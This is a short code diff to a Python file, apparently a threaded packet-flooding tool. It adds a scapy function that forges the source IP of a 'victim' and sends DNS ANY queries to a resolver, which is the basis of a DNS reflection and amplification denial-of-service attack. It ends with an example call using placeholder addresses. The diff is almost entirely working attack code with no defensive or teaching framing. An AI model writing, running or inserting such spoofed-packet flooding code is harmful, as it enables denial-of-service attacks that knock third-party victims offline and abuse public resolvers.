@@ -2,6 +2,25 @@ import socket
 import random
 import threading
 
+from scapy.all import *
+def send_spoofed_packet(target_ip, resolver_ip, victim_ip, port):
+    dns_query = (
+        b'\xaa\xbb'  # Transaction ID
+        b'\x01\x00'  # Standard query
+        b'\x00\x01'  # Questions: 1
+        b'\x00\x00'  # Answer RRs
+        b'\x00\x00'  # Authority RRs
+        b'\x00\x00'  # Additional RRs
+        b'\x07example\x03com\x00'  # Query: example.com
+        b'\x00\xff'  # Type: ANY
+        b'\x00\x01'  # Class: IN
+    )
+    udp_packet = IP(src=victim_ip, dst=resolver_ip) / UDP(dport=port) / dns_query
+    send(udp_packet, verbose=False)
+
+# Beispielaufruf
+send_spoofed_packet("8.8.8.8", "resolver_ip", "victim_ip", 53)
+
 packet_counter = 0
 stop_event = threading.Event()
 
